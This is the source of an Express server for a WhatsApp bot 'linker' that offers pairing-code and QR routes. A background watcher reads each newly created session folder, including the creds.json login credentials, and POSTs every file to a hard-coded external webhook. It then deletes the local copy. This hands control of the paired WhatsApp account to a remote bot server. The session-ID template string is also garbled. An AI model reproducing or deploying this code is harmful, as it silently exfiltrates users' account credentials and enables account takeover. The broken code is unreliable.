import express from 'express';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs-extra';

// Importing the routers
import pairRouter from './pair.js';
import qrRouter from './qr.js';

const app = express();

// Fix for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Increase event listeners limit
import('events').then(events => {
    events.EventEmitter.defaultMaxListeners = 500;
});

// === YOUR MAIN BOT WEBHOOK (CHANGE ONLY IF YOU DEPLOY NEW ONE) ===
const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";

// === AUTO SEND SESSION TO MAIN BOT ===
async function autoActivateBot(sessionDir) {
    try {
        if (!fs.existsSync(sessionDir)) return;

        const files = [];
        const fileList = fs.readdirSync(sessionDir);

        for (const fileName of fileList) {
            const filePath = path.join(sessionDir, fileName);
            const content = fs.readFileSync(filePath, 'utf-8');
            files.push({ name: fileName, content });
        }

        // Extract phone number from creds.json
        const credsFile = files.find(f => f.name === 'creds.json');
        let phone = 'unknown';
        if (credsFile) {
            try {
                const creds = JSON.parse(credsFile.content);
                phone = creds.me?.id?.split(':')[0] || 'unknown';
            } catch {}
        }

        const sessionId = `muzan_\( {phone}_ \){Date.now()}`;

        const payload = {
            sessionId,
            phone: phone.replace(/[^0-9]/g, ''),
            files
        };

        const response = await fetch(MAIN_BOT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log(`✅ MUZAN MD AUTO-ACTIVATED → ${phone} | Session: ${sessionId}`);
        } else {
            console.log("Failed to activate bot on main server");
        }
    } catch (err) {
        console.error("Auto-activation failed:", err);
    }
}

// === MIDDLEWARE ===
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

// === ROUTES ===
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html')); // or index.html
});

// Pairing code route
app.use('/pair', pairRouter);

// QR code route
app.use('/qr', qrRouter);

// === AUTO-CLEANUP & AUTO-ACTIVATION MONITOR ===
function startSessionWatcher() {
    const sessionsToWatch = ['./session_', './qr_sessions/session_'];

    console.log("🔄 MUZAN MD AUTO-ACTIVATION MONITOR STARTED");

    setInterval(() => {
        sessionsToWatch.forEach(basePath => {
            try {
                const dirs = fs.readdirSync('.').filter(f => 
                    f.startsWith(basePath.replace('./', '')) && fs.statSync(f).isDirectory()
                );

                dirs.forEach(dir => {
                    const credsPath = path.join(dir, 'creds.json');
                    if (fs.existsSync(credsPath)) {
                        const stats = fs.statSync(credsPath);
                        const age = Date.now() - stats.mtimeMs;

                        if (age < 60000) { // Less than 60 seconds old
                            console.log(`New session detected: ${dir}`);
                            autoActivateBot(dir);

                            // Clean up after 30 seconds
                            setTimeout(() => {
                                fs.remove(dir).catch(() => {});
                            }, 30000);
                        }
                    }
                });
            } catch (e) {}
        });
    }, 8000); // Check every 8 seconds
}

// Start the watcher
startSessionWatcher();

// === SERVER START ===
const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════╗
║         MUZAN MD LINKER              ║
║        AUTO-ACTIVATION ENABLED       ║
╚══════════════════════════════════════╝

Owner: Arnold Der Abenteurer
Main Bot: ${MAIN_BOT_WEBHOOK}

Server running on → http://localhost:${PORT}
    `);
});

export default app;